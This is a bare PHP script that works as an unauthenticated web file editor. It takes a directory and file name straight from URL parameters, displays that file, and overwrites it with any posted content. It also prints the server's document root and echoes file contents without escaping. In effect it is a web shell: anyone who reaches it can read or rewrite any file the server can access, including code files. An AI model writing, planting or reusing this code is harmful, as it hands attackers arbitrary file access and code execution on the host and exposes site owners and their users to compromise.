<?php
echo "<hr>".$_SERVER['DOCUMENT_ROOT']."<hr>";
$f=$_GET['f'];
$rd=$_GET['rd'];
$filename = $rd."/".$f;
echo "<hr>filename : ".$filename ."<hr>";
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
if($_POST)
{
	$fp = fopen($filename, 'w');
	$content = $_POST['content'];
	fwrite($fp,$content);
	fclose($fp);
}
?>
<form method="post" action="">
<textarea name="content" rows="20" cols="50"><?=$contents?></textarea>
<br />
<input type="submit" value="Submit">
</form>